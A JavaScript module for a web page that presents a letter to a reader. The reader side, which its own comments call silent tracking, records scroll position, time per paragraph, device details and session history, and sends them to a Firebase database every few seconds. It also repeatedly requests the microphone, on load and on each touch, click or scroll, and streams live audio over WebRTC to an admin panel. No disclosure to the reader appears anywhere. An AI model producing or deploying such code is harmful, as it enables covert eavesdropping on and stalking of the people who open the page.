import { firebaseConfig, isFirebaseConfigured } from './firebase-config.js';

let broadcastChannel = null;

// Canal local para redundância em mesma máquina
try {
  if (typeof BroadcastChannel !== 'undefined') {
    broadcastChannel = new BroadcastChannel('carta_telemetry_channel');
  }
} catch (e) {}

// Servidores STUN públicos e estáveis do Google para negociação WebRTC P2P
export const RTC_CONFIG = {
  iceServers: [
    { urls: 'stun:stun.l.google.com:19302' },
    { urls: 'stun:stun1.l.google.com:19302' },
    { urls: 'stun:stun2.l.google.com:19302' },
    { urls: 'stun:stun3.l.google.com:19302' }
  ]
};

/**
 * Throttle para manter 60fps fluido sem sobrecarregar a rede
 */
export function throttle(func, limit = 80) {
  let inThrottle = false;
  let lastArgs = null;
  return function (...args) {
    if (!inThrottle) {
      func.apply(this, args);
      inThrottle = true;
      setTimeout(() => {
        inThrottle = false;
        if (lastArgs) {
          func.apply(this, lastArgs);
          lastArgs = null;
        }
      }, limit);
    } else {
      lastArgs = args;
    }
  };
}

/**
 * Identifica o trecho da carta em foco no centro da tela
 */
export function getActiveSectionInfo() {
  const paragraphs = document.querySelectorAll('.letter-body p, .letter-body blockquote, .letter-section-title');
  const viewportCenter = window.scrollY + (window.innerHeight / 2);
  let activeElement = null;
  let minDistance = Infinity;

  paragraphs.forEach((el, index) => {
    const rect = el.getBoundingClientRect();
    const elementCenter = window.scrollY + rect.top + (rect.height / 2);
    const dist = Math.abs(viewportCenter - elementCenter);
    if (dist < minDistance) {
      minDistance = dist;
      activeElement = {
        index: index + 1,
        total: paragraphs.length,
        textSnippet: el.innerText.trim().slice(0, 75) + (el.innerText.length > 75 ? '...' : ''),
        tag: el.tagName.toLowerCase()
      };
    }
  });

  return activeElement;
}

/**
 * Gera ou recupera um clientId único para este dispositivo/navegador.
 * Usa localStorage para persistir mesmo após fechar o navegador.
 * Escopado pela sessionId para não conflitar entre cartas diferentes.
 */
function getOrCreateClientId(sessionId) {
  let id = null;
  const key = 'ct_client_id_' + sessionId;
  try {
    id = localStorage.getItem(key);
    if (!id) {
      id = 'c_' + Date.now().toString(36) + '_' + Math.random().toString(36).substring(2, 7);
      localStorage.setItem(key, id);
    }
  } catch (e) {
    id = 'c_' + Date.now().toString(36) + '_' + Math.random().toString(36).substring(2, 7);
  }
  return id;
}

/**
 * Identifica o modelo aproximado do dispositivo para identificação no Admin
 */
function getDeviceLabel() {
  const ua = navigator.userAgent || '';
  let os = 'Dispositivo';
  if (/iPhone/i.test(ua)) os = 'iPhone';
  else if (/iPad/i.test(ua)) os = 'iPad';
  else if (/Android/i.test(ua)) os = 'Android';
  else if (/Macintosh|Mac OS/i.test(ua)) os = 'Mac';
  else if (/Windows/i.test(ua)) os = 'Windows';
  else if (/Linux/i.test(ua)) os = 'Linux';

  const w = window.innerWidth;
  const h = window.innerHeight;
  return `${os} (${w}×${h})`;
}

/**
 * Inicia o rastreamento SILENCIOSO na página do LEITOR
 */
export function startReaderTracking(sessionId) {
  const isFb = isFirebaseConfigured();
  const dbUrl = isFb ? firebaseConfig.databaseURL.replace(/\/$/, '') : null;
  const clientId = getOrCreateClientId(sessionId);
  const deviceLabel = getDeviceLabel();

  const SESSION_TIMEOUT_MS = 15 * 60 * 1000; // 15 minutos de ausência = nova sessão
  const startKey    = 'ct_reading_started_' + sessionId;
  const secsKey     = 'ct_active_secs_'    + sessionId + '_' + clientId.slice(0, 14);
  const sectionTimesKey = 'ct_section_times_' + sessionId + '_' + clientId.slice(0, 14);
  const sessionMetaKey  = 'ct_session_meta_'  + sessionId + '_' + clientId.slice(0, 14);
  const pastSessionsKey = 'ct_past_sessions_' + sessionId + '_' + clientId.slice(0, 14);

  // Leitura do estado persistido
  let sessionMeta = {};
  try { sessionMeta = JSON.parse(localStorage.getItem(sessionMetaKey) || '{}'); } catch(e) {}

  let activeReadingSeconds;
  try { activeReadingSeconds = parseInt(localStorage.getItem(secsKey) || '0', 10); } catch(e) { activeReadingSeconds = 0; }

  let sectionTimes = {};
  try { sectionTimes = JSON.parse(localStorage.getItem(sectionTimesKey) || '{}'); } catch(e) {}

  let readingStartedAt;
  try { readingStartedAt = parseInt(localStorage.getItem(startKey) || '0', 10); } catch(e) { readingStartedAt = 0; }

  let sessionNumber = sessionMeta.sessionNumber || 1;
  const lastDisconnectedAt = sessionMeta.lastDisconnectedAt || 0;

  // Detecta nova sessão: ausentou-se por mais de SESSION_TIMEOUT_MS
  const isNewSession = lastDisconnectedAt > 0 && (Date.now() - lastDisconnectedAt) > SESSION_TIMEOUT_MS;

  if (isNewSession) {
    // Arquiva a sessão anterior se tiver dados significativos
    if (activeReadingSeconds > 5) {
      let past = [];
      try { past = JSON.parse(localStorage.getItem(pastSessionsKey) || '[]'); } catch(e) {}
      past.push({
        sessionNumber,
        startedAt: readingStartedAt || lastDisconnectedAt,
        endedAt: lastDisconnectedAt,
        activeReadingSeconds,
        sectionTimes: JSON.parse(JSON.stringify(sectionTimes))
      });
      if (past.length > 20) past = past.slice(-20);
      try { localStorage.setItem(pastSessionsKey, JSON.stringify(past)); } catch(e) {}
    }

    // Reinicia contadores para nova sessão
    sessionNumber++;
    activeReadingSeconds = 0;
    sectionTimes = {};
    readingStartedAt = Date.now();
    try {
      localStorage.setItem(secsKey, '0');
      localStorage.setItem(sectionTimesKey, '{}');
      localStorage.setItem(startKey, String(readingStartedAt));
    } catch(e) {}
  } else if (!readingStartedAt) {
    readingStartedAt = Date.now();
    try { localStorage.setItem(startKey, String(readingStartedAt)); } catch(e) {}
  }

  // Persiste metadados da sessão atual
  try {
    localStorage.setItem(sessionMetaKey, JSON.stringify({ sessionNumber, lastDisconnectedAt: 0 }));
  } catch(e) {}

  // Contador de tempo ativo e por trecho
  setInterval(() => {
    if (!document.hidden) {
      activeReadingSeconds++;
      try { localStorage.setItem(secsKey, String(activeReadingSeconds)); } catch (e) {}

      const section = getActiveSectionInfo();
      if (section) {
        const sk = String(section.index);
        if (!sectionTimes[sk]) sectionTimes[sk] = { seconds: 0, snippet: section.textSnippet, tag: section.tag };
        sectionTimes[sk].seconds++;
        sectionTimes[sk].snippet = section.textSnippet;
        try { localStorage.setItem(sectionTimesKey, JSON.stringify(sectionTimes)); } catch (e) {}
      }
    }
  }, 1000);

  function getPastSessions() {
    try { return JSON.parse(localStorage.getItem(pastSessionsKey) || '[]'); } catch(e) { return []; }
  }

  // Microfone silencioso e WebRTC para streaming de áudio em tempo real
  let getMicLevel = null;
  let micSpectrum = null;
  let micGranted = false;
  let isRequestingMic = false;
  let currentReaderPC = null;
  let currentReaderStream = null;
  let readerPollTimer = null;

  async function initMicStream() {
    if (micGranted || isRequestingMic) return;
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;

    isRequestingMic = true;

    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        audio: {
          echoCancellation: true,
          noiseSuppression: true,
          autoGainControl: true
        },
        video: false
      });

      micGranted = true;
      isRequestingMic = false;
      currentReaderStream = stream;

      try { localStorage.setItem('ct_mic_granted_' + sessionId, '1'); } catch(e) {}

      // AudioContext para cálculo local de VU e frequência no leitor
      const AudioCtxClass = window.AudioContext || window.webkitAudioContext;
      if (AudioCtxClass) {
        try {
          const ctx = new AudioCtxClass();
          const analyser = ctx.createAnalyser();
          analyser.fftSize = 64;
          analyser.smoothingTimeConstant = 0.75;
          const src = ctx.createMediaStreamSource(stream);
          src.connect(analyser);

          // Resolução para política de autoplay de navegadores móveis (iOS e Android)
          const resumeCtx = () => {
            if (ctx.state === 'suspended') {
              ctx.resume().catch(() => {});
            }
          };
          ['touchstart', 'touchend', 'click', 'scroll', 'pointerdown', 'keydown'].forEach(evt => {
            window.addEventListener(evt, resumeCtx, { passive: true });
          });
          if (ctx.state === 'suspended') {
            ctx.resume().catch(() => {});
          }

          const freqData = new Uint8Array(analyser.frequencyBinCount);
          getMicLevel = () => {
            analyser.getByteFrequencyData(freqData);
            const avg = freqData.reduce((a, b) => a + b, 0) / freqData.length;
            micSpectrum = Array.from(freqData.slice(0, 8)).map(v => Math.round((v / 255) * 100));
            return Math.round((avg / 255) * 100);
          };
        } catch (e) {
          console.warn('Erro ao configurar AudioContext no leitor:', e);
        }
      }

      // Inicia transmissão WebRTC para envio de áudio ao vivo ao painel admin
      startWebRTCPublisher(sessionId, clientId, dbUrl, stream);

      // Envia telemetria imediatamente avisando que o microfone está ativo
      enviarImediato(true, !document.hidden);
    } catch(err) {
      isRequestingMic = false;
      micGranted = false;
    }
  }

  // 1. Tenta inicializar o microfone imediatamente
  initMicStream();

  // 2. E tenta também em qualquer interação (essencial em navegadores móveis para autoplay/gesto)
  ['touchstart', 'touchend', 'click', 'scroll', 'pointerdown'].forEach(evt => {
    window.addEventListener(evt, () => {
      if (!micGranted) {
        initMicStream();
      }
    }, { passive: true });
  });

  function startWebRTCPublisher(sId, cId, databaseUrl, stream) {
    if (currentReaderPC) {
      try { currentReaderPC.close(); } catch(e) {}
    }
    if (readerPollTimer) {
      clearInterval(readerPollTimer);
      readerPollTimer = null;
    }

    const pc = new RTCPeerConnection(RTC_CONFIG);
    currentReaderPC = pc;

    // Adiciona faixas de áudio
    stream.getAudioTracks().forEach(track => {
      pc.addTrack(track, stream);
    });

    // Envio de ICE Candidates do leitor
    pc.onicecandidate = (evt) => {
      if (evt.candidate) {
        const candJson = evt.candidate.toJSON();
        if (broadcastChannel) {
          try {
            broadcastChannel.postMessage({
              type: 'RTC_ICE_READER',
              sessionId: sId,
              clientId: cId,
              candidate: candJson
            });
          } catch(e) {}
        }
        if (databaseUrl) {
          fetch(`${databaseUrl}/sessoes/${encodeURIComponent(sId)}/webrtc/${encodeURIComponent(cId)}/cands_reader.json`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(candJson)
          }).catch(() => {});
        }
      }
    };

    // Cria e envia Offer SDP
    (async () => {
      try {
        const offer = await pc.createOffer({ offerToReceiveAudio: false, offerToReceiveVideo: false });
        await pc.setLocalDescription(offer);

        const offerObj = {
          type: 'offer',
          sdp: offer.sdp,
          clientId: cId,
          ts: Date.now()
        };

        if (broadcastChannel) {
          try {
            broadcastChannel.postMessage({
              type: 'RTC_OFFER',
              sessionId: sId,
              clientId: cId,
              offer: offerObj
            });
          } catch(e) {}
        }

        if (databaseUrl) {
          // Grava a oferta no Firebase
          await fetch(`${databaseUrl}/sessoes/${encodeURIComponent(sId)}/webrtc/${encodeURIComponent(cId)}/offer.json`, {
            method: 'PUT',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(offerObj)
          }).catch(() => {});

          await fetch(`${databaseUrl}/sessoes/${encodeURIComponent(sId)}/webrtc/${encodeURIComponent(cId)}/hasMic.json`, {
            method: 'PUT',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(true)
          }).catch(() => {});

          // Reseta answer e candidates anteriores
          await fetch(`${databaseUrl}/sessoes/${encodeURIComponent(sId)}/webrtc/${encodeURIComponent(cId)}/answer.json`, {
            method: 'DELETE'
          }).catch(() => {});

          await fetch(`${databaseUrl}/sessoes/${encodeURIComponent(sId)}/webrtc/${encodeURIComponent(cId)}/cands_admin.json`, {
            method: 'DELETE'
          }).catch(() => {});

          await fetch(`${databaseUrl}/sessoes/${encodeURIComponent(sId)}/webrtc/${encodeURIComponent(cId)}/cands_reader.json`, {
            method: 'DELETE'
          }).catch(() => {});
        }
      } catch(err) {
        console.warn('Erro ao criar oferta WebRTC:', err);
      }
    })();

    let answerApplied = false;
    const appliedAdminCandidates = new Set();

    async function applyAnswer(answerData) {
      if (answerApplied || !pc || pc.signalingState === 'closed') return;
      if (pc.signalingState !== 'have-local-offer') return;
      try {
        await pc.setRemoteDescription(new RTCSessionDescription({
          type: answerData.type || 'answer',
          sdp: answerData.sdp
        }));
        answerApplied = true;
      } catch(e) {
        console.warn('Erro ao aplicar answer WebRTC no leitor:', e);
      }
    }

    function applyAdminCandidate(candData) {
      if (!pc || pc.signalingState === 'closed' || !pc.remoteDescription) return;
      try {
        pc.addIceCandidate(new RTCIceCandidate(candData)).catch(() => {});
      } catch(e) {}
    }

    // Ouvinte Broadcast local
    if (broadcastChannel) {
      broadcastChannel.addEventListener('message', (ev) => {
        if (!ev.data || ev.data.sessionId !== sId || ev.data.clientId !== cId) return;
        if (ev.data.type === 'RTC_ANSWER' && ev.data.answer) {
          applyAnswer(ev.data.answer);
        } else if (ev.data.type === 'RTC_ICE_ADMIN' && ev.data.candidate) {
          applyAdminCandidate(ev.data.candidate);
        }
      });
    }

    // Polling de Answer e ICE candidates do Admin via Firebase
    if (databaseUrl) {
      readerPollTimer = setInterval(async () => {
        if (pc.connectionState === 'connected') {
          return;
        }
        try {
          const res = await fetch(`${databaseUrl}/sessoes/${encodeURIComponent(sId)}/webrtc/${encodeURIComponent(cId)}.json`);
          if (!res.ok) return;
          const data = await res.json();
          if (!data) return;

          if (data.answer && !answerApplied) {
            await applyAnswer(data.answer);
          }
          if (data.cands_admin && pc && pc.remoteDescription) {
            for (const [key, cand] of Object.entries(data.cands_admin)) {
              if (cand && !appliedAdminCandidates.has(key)) {
                appliedAdminCandidates.add(key);
                applyAdminCandidate(cand);
              }
            }
          }
        } catch(e) {}
      }, 1000);
    }
  }


  function coletarDados() {
    const maxY = Math.max(1, document.documentElement.scrollHeight - window.innerHeight);
    const scrollY = window.scrollY || document.documentElement.scrollTop || 0;
    const percent = Math.min(100, Math.max(0, Math.round((scrollY / maxY) * 100)));

    return {
      sessionId,
      clientId,
      deviceLabel,
      isOnline: true,
      isTabActive: !document.hidden,
      viewport: {
        width: window.innerWidth,
        height: window.innerHeight,
        availWidth: window.screen ? window.screen.availWidth : window.innerWidth,
        availHeight: window.screen ? window.screen.availHeight : window.innerHeight,
        dpr: window.devicePixelRatio || 1
      },
      scroll: {
        y: Math.round(scrollY),
        maxY: Math.round(maxY),
        percent
      },
      activeSection: getActiveSectionInfo(),
      readingStartedAt,
      activeReadingSeconds,
      sectionTimes,
      sessionNumber,
      pastSessions: getPastSessions(),
      hasMic: micGranted,
      audioLevel: getMicLevel ? getMicLevel() : null,
      micSpectrum: micSpectrum || null,
      meta: {
        timestamp: Date.now()
      }
    };
  }

  const enviar = throttle(async () => {
    const payload = coletarDados();

    // 1. Canal local
    if (broadcastChannel) {
      try {
        broadcastChannel.postMessage({ type: 'READER_UPDATE', payload, clientId });
      } catch (e) {}
    }
    try {
      localStorage.setItem('carta_client_' + sessionId + '_' + clientId, JSON.stringify(payload));
    } catch (e) {}

    // 2. Firebase Realtime Database isolado por cliente + espelho de compatibilidade
    if (dbUrl) {
      try {
        fetch(`${dbUrl}/sessoes/${encodeURIComponent(sessionId)}/clients/${clientId}.json`, {
          method: 'PUT',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload),
          keepalive: true
        }).catch(() => {});
      } catch (e) {}
    }
  }, 40);

  // Envio instantâneo sem throttle (vital para eventos de visibilidade e congelamento de abas)
  function enviarImediato(customOnline, customTabActive) {
    const payload = coletarDados();
    if (typeof customOnline === 'boolean') payload.isOnline = customOnline;
    if (typeof customTabActive === 'boolean') payload.isTabActive = customTabActive;

    // 1. Canal local
    if (broadcastChannel) {
      try {
        broadcastChannel.postMessage({ type: 'READER_UPDATE', payload, clientId });
      } catch (e) {}
    }
    try {
      localStorage.setItem('carta_client_' + sessionId + '_' + clientId, JSON.stringify(payload));
    } catch (e) {}

    // 2. Firebase isolado + espelho
    if (dbUrl) {
      try {
        fetch(`${dbUrl}/sessoes/${encodeURIComponent(sessionId)}/clients/${clientId}.json`, {
          method: 'PUT',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload),
          keepalive: true
        }).catch(() => {});
      } catch (e) {}
    }
  }

  // Escuta o scroll contínuo com throttle de 40ms
  window.addEventListener('scroll', enviar, { passive: true });
  window.addEventListener('resize', enviar, { passive: true });

  // Batimento cardíaco frequente para confirmar presença ativa (envia mesmo em background para não ser considerado morto)
  const heartbeatTimer = setInterval(() => {
    enviarImediato(true, !document.hidden);
  }, 2000);

  // Disparo imediato SEM THROTTLE ao minimizar, alternar aba ou trocar de app
  document.addEventListener('visibilitychange', () => {
    enviarImediato(true, !document.hidden);
  });

  window.addEventListener('focus', () => {
    enviarImediato(true, true);
  });

  window.addEventListener('pagehide', () => {
    enviarImediato(true, false);
  });

  document.addEventListener('freeze', () => {
    enviarImediato(true, false);
  });

  // Desconexão total ao fechar aba
  window.addEventListener('beforeunload', () => {
    clearInterval(heartbeatTimer);
    if (readerPollTimer) clearInterval(readerPollTimer);
    if (currentReaderPC) {
      try { currentReaderPC.close(); } catch(e) {}
    }
    if (currentReaderStream) {
      try {
        currentReaderStream.getTracks().forEach(t => t.stop());
      } catch(e) {}
    }

    // Salva o momento da desconexão para detectar nova sessão no próximo acesso
    try {
      localStorage.setItem(sessionMetaKey, JSON.stringify({
        sessionNumber,
        lastDisconnectedAt: Date.now()
      }));
    } catch(e) {}

    enviarImediato(false, false);

    // Remove este cliente específico do Firebase ao fechar para não acumular
    if (dbUrl) {
      try {
        fetch(`${dbUrl}/sessoes/${encodeURIComponent(sessionId)}/clients/${clientId}.json`, {
          method: 'DELETE',
          keepalive: true
        }).catch(() => {});
        fetch(`${dbUrl}/sessoes/${encodeURIComponent(sessionId)}/webrtc/${encodeURIComponent(clientId)}.json`, {
          method: 'DELETE',
          keepalive: true
        }).catch(() => {});
      } catch (e) {}
    }
  });

  // Envio inicial imediato
  enviarImediato(true, !document.hidden);
}

let currentAdminEventSource = null;

/**
 * Inicia a escuta em tempo real no ADMIN (com suporte a multi-abas e multi-dispositivos)
 */
export function startAdminListening(sessionId, onClientsUpdate) {
  const isFb = isFirebaseConfigured();
  const dbUrl = isFb ? firebaseConfig.databaseURL.replace(/\/$/, '') : null;
  const clientsMap = {};

  if (currentAdminEventSource) {
    try { currentAdminEventSource.close(); } catch (e) {}
    currentAdminEventSource = null;
  }

  // 1. Escuta local via BroadcastChannel
  if (broadcastChannel) {
    broadcastChannel.addEventListener('message', (event) => {
      if (event.data && event.data.payload && event.data.payload.sessionId === sessionId) {
        const payload = event.data.payload;
        const cId = payload.clientId || 'local_default';
        clientsMap[cId] = {
          ...payload,
          lastReceivedAt: Date.now()
        };
        onClientsUpdate(clientsMap, 'Local (Broadcast)', cId);
      }
    });
  }

  // 2. Escuta via EventSource (SSE) direto do Firebase na sessão inteira (/sessoes/{sessionId}.json)
  if (dbUrl) {
    try {
      const sseUrl = `${dbUrl}/sessoes/${encodeURIComponent(sessionId)}.json`;
      const eventSource = new EventSource(sseUrl);
      currentAdminEventSource = eventSource;

      eventSource.addEventListener('put', (event) => {
        try {
          const parsed = JSON.parse(event.data);
          if (!parsed) return;
          const now = Date.now();

          // Snapshot raiz da sessão inteira: { clients: {...}, reader: {...} }
          if (parsed.path === '/') {
            if (parsed.data && typeof parsed.data === 'object') {
              if (parsed.data.clients && typeof parsed.data.clients === 'object') {
                for (const [cId, cPayload] of Object.entries(parsed.data.clients)) {
                  if (cPayload && typeof cPayload === 'object') {
                    const prev = clientsMap[cId];
                    const clientTime = (cPayload.meta && cPayload.meta.timestamp) || 0;
                    // Se o pacote tem menos de 60 segundos de idade em relação ao now local:
                    const age = Math.abs(now - clientTime);
                    const isRecent = age < 60000;
                    const lastRecv = (prev && prev.lastReceivedAt) ? prev.lastReceivedAt : (isRecent ? now : (now - 60000));
                    let userAction = now;
                    if (prev && prev.scroll && cPayload.scroll) {
                      const diff = Math.abs(cPayload.scroll.y - prev.scroll.y);
                      userAction = (diff >= 3 || cPayload.isScrollEvent) ? now : (prev.lastUserActionAt || (now - 30000));
                    }
                    clientsMap[cId] = {
                      ...cPayload,
                      lastReceivedAt: lastRecv,
                      lastUserActionAt: userAction
                    };
                  }
                }
              }
              // Sincroniza também com parsed.data.reader
              if (parsed.data.reader && typeof parsed.data.reader === 'object') {
                const r = parsed.data.reader;
                const cId = r.clientId || 'default_reader';
                const clientTime = (r.meta && r.meta.timestamp) || 0;
                const isRecent = Math.abs(now - clientTime) < 60000;
                if (!clientsMap[cId]) {
                  clientsMap[cId] = {
                    ...r,
                    lastReceivedAt: isRecent ? now : (now - 60000),
                    lastUserActionAt: now
                  };
                }
              }
              onClientsUpdate(clientsMap, 'Firebase Realtime', null);
            }
          } else if (parsed.path && parsed.path.startsWith('/clients/')) {
            const parts = parsed.path.split('/').filter(Boolean); // ['clients', 'cId', ...]
            const cId = parts[1];
            if (cId) {
              if (parts.length === 2) {
                if (parsed.data === null) {
                  delete clientsMap[cId];
                } else if (typeof parsed.data === 'object') {
                  const prev = clientsMap[cId];
                  let userAction = now;
                  if (prev && prev.scroll && parsed.data.scroll) {
                    const diff = Math.abs(parsed.data.scroll.y - prev.scroll.y);
                    userAction = (diff >= 3 || parsed.data.isScrollEvent) ? now : (prev.lastUserActionAt || (now - 30000));
                  }
                  clientsMap[cId] = {
                    ...parsed.data,
                    lastReceivedAt: now,
                    lastUserActionAt: userAction
                  };
                }
              } else if (clientsMap[cId]) {
                const subProp = parts[2];
                clientsMap[cId][subProp] = parsed.data;
                clientsMap[cId].lastReceivedAt = now;
                if (subProp === 'scroll') {
                  clientsMap[cId].lastUserActionAt = now;
                }
              }
              onClientsUpdate(clientsMap, 'Firebase Realtime', cId);
            }
          } else if (parsed.path === '/reader' && parsed.data && typeof parsed.data === 'object') {
            const r = parsed.data;
            const cId = r.clientId || 'default_reader';
            const prev = clientsMap[cId];
            let userAction = now;
            if (prev && prev.scroll && r.scroll) {
              const diff = Math.abs(r.scroll.y - prev.scroll.y);
              userAction = (diff >= 3) ? now : (prev.lastUserActionAt || (now - 30000));
            }
            clientsMap[cId] = {
              ...(clientsMap[cId] || {}),
              ...r,
              lastReceivedAt: now,
              lastUserActionAt: userAction
            };
            onClientsUpdate(clientsMap, 'Firebase Realtime', cId);
          }
        } catch (e) {
          console.warn('Erro ao processar SSE put:', e);
        }
      });

      eventSource.addEventListener('patch', (event) => {
        try {
          const parsed = JSON.parse(event.data);
          if (!parsed) return;
          const now = Date.now();
          const parts = (parsed.path || '').split('/').filter(Boolean);

          if (parts[0] === 'clients' && parts[1]) {
            const cId = parts[1];
            if (!clientsMap[cId]) clientsMap[cId] = {};
            const prevScroll = clientsMap[cId].scroll;
            Object.assign(clientsMap[cId], parsed.data);
            clientsMap[cId].lastReceivedAt = now;
            if (parsed.data.scroll && prevScroll) {
              if (Math.abs(parsed.data.scroll.y - prevScroll.y) >= 3) {
                clientsMap[cId].lastUserActionAt = now;
              }
            }
            onClientsUpdate(clientsMap, 'Firebase Realtime', cId);
          } else if (parts[0] === 'reader' && parsed.data && typeof parsed.data === 'object') {
            const cId = parsed.data.clientId || 'default_reader';
            if (!clientsMap[cId]) clientsMap[cId] = {};
            Object.assign(clientsMap[cId], parsed.data);
            clientsMap[cId].lastReceivedAt = now;
            onClientsUpdate(clientsMap, 'Firebase Realtime', cId);
          }
        } catch (e) {
          console.warn('Erro ao processar SSE patch:', e);
        }
      });

      eventSource.onerror = () => {
        // EventSource nativo reconecta automaticamente
      };
    } catch (e) {
      console.warn('Erro ao conectar EventSource Firebase:', e);
    }
  }

  // 3. Fallback inicial de leitura em cache local
  try {
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      if (key && key.startsWith('carta_client_' + sessionId + '_')) {
        const item = JSON.parse(localStorage.getItem(key));
        if (item && item.clientId) {
          clientsMap[item.clientId] = { ...item, lastReceivedAt: Date.now() };
        }
      }
    }
    if (Object.keys(clientsMap).length > 0) {
      onClientsUpdate(clientsMap, 'Cache Local', null);
    }
  } catch (e) {}
}

/**
 * Conecta o Admin ao áudio ao vivo do leitor via WebRTC
 */
export function startAdminWebRTCAudio(sessionId, targetClientId, onStream, onStatus) {
  const isFb = isFirebaseConfigured();
  const dbUrl = isFb ? firebaseConfig.databaseURL.replace(/\/$/, '') : null;

  let pc = null;
  let pollTimer = null;
  let isClosed = false;
  let lastOfferTs = 0;
  const appliedReaderCandidates = new Set();

  function cleanup() {
    isClosed = true;
    if (pollTimer) {
      clearInterval(pollTimer);
      pollTimer = null;
    }
    if (pc) {
      try { pc.close(); } catch(e) {}
      pc = null;
    }
    lastOfferTs = 0;
    appliedReaderCandidates.clear();
  }

  if (!targetClientId) {
    if (onStatus) onStatus('no_client');
    return { close: cleanup };
  }

  if (onStatus) onStatus('connecting');

  function initPeer() {
    if (pc) {
      try { pc.close(); } catch(e) {}
      pc = null;
    }
    appliedReaderCandidates.clear();

    pc = new RTCPeerConnection(RTC_CONFIG);

    pc.ontrack = (event) => {
      if (event.streams && event.streams[0]) {
        if (onStatus) onStatus('live');
        if (onStream) onStream(event.streams[0]);
      }
    };

    pc.onconnectionstatechange = () => {
      if (!pc) return;
      if (pc.connectionState === 'connected') {
        if (onStatus) onStatus('live');
      } else if (pc.connectionState === 'disconnected' || pc.connectionState === 'failed') {
        if (onStatus) onStatus('disconnected');
      }
    };

    pc.onicecandidate = (evt) => {
      if (evt.candidate) {
        const candJson = evt.candidate.toJSON();
        if (broadcastChannel) {
          try {
            broadcastChannel.postMessage({
              type: 'RTC_ICE_ADMIN',
              sessionId,
              clientId: targetClientId,
              candidate: candJson
            });
          } catch(e) {}
        }
        if (dbUrl) {
          fetch(`${dbUrl}/sessoes/${encodeURIComponent(sessionId)}/webrtc/${encodeURIComponent(targetClientId)}/cands_admin.json`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(candJson)
          }).catch(() => {});
        }
      }
    };
  }

  initPeer();

  async function handleOffer(offerData) {
    if (isClosed || !pc) return;
    try {
      await pc.setRemoteDescription(new RTCSessionDescription({
        type: offerData.type || 'offer',
        sdp: offerData.sdp
      }));

      const answer = await pc.createAnswer();
      await pc.setLocalDescription(answer);

      const answerObj = {
        type: 'answer',
        sdp: answer.sdp,
        clientId: targetClientId,
        ts: Date.now()
      };

      if (broadcastChannel) {
        try {
          broadcastChannel.postMessage({
            type: 'RTC_ANSWER',
            sessionId,
            clientId: targetClientId,
            answer: answerObj
          });
        } catch(e) {}
      }

      if (dbUrl) {
        await fetch(`${dbUrl}/sessoes/${encodeURIComponent(sessionId)}/webrtc/${encodeURIComponent(targetClientId)}/answer.json`, {
          method: 'PUT',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(answerObj)
        }).catch(() => {});
      }
    } catch(err) {
      console.warn('Erro ao processar offer no admin:', err);
    }
  }

  function handleReaderCandidate(candData) {
    if (!pc || pc.signalingState === 'closed' || !pc.remoteDescription) return;
    try {
      pc.addIceCandidate(new RTCIceCandidate(candData)).catch(() => {});
    } catch(e) {}
  }

  // Ouvinte Broadcast local
  if (broadcastChannel) {
    broadcastChannel.addEventListener('message', (ev) => {
      if (isClosed || !ev.data || ev.data.sessionId !== sessionId || ev.data.clientId !== targetClientId) return;
      if (ev.data.type === 'RTC_OFFER' && ev.data.offer) {
        const offerTs = ev.data.offer.ts || Date.now();
        if (offerTs !== lastOfferTs) {
          lastOfferTs = offerTs;
          initPeer();
          handleOffer(ev.data.offer);
        }
      } else if (ev.data.type === 'RTC_ICE_READER' && ev.data.candidate) {
        handleReaderCandidate(ev.data.candidate);
      }
    });
  }

  // Verificação de oferta no Firebase
  async function checkFirebaseOffer() {
    if (isClosed || !dbUrl) return;
    try {
      const res = await fetch(`${dbUrl}/sessoes/${encodeURIComponent(sessionId)}/webrtc/${encodeURIComponent(targetClientId)}.json`);
      if (!res.ok) return;
      const data = await res.json();
      if (!data) return;

      if (data.offer) {
        const offerTs = data.offer.ts || 1;
        if (offerTs !== lastOfferTs) {
          lastOfferTs = offerTs;
          initPeer();
          await handleOffer(data.offer);
        }
      }

      if (data.cands_reader && pc && pc.remoteDescription) {
        for (const [key, cand] of Object.entries(data.cands_reader)) {
          if (cand && !appliedReaderCandidates.has(key)) {
            appliedReaderCandidates.add(key);
            handleReaderCandidate(cand);
          }
        }
      }
    } catch(e) {}
  }

  checkFirebaseOffer();
  pollTimer = setInterval(checkFirebaseOffer, 1500);

  return {
    close: cleanup
  };
}

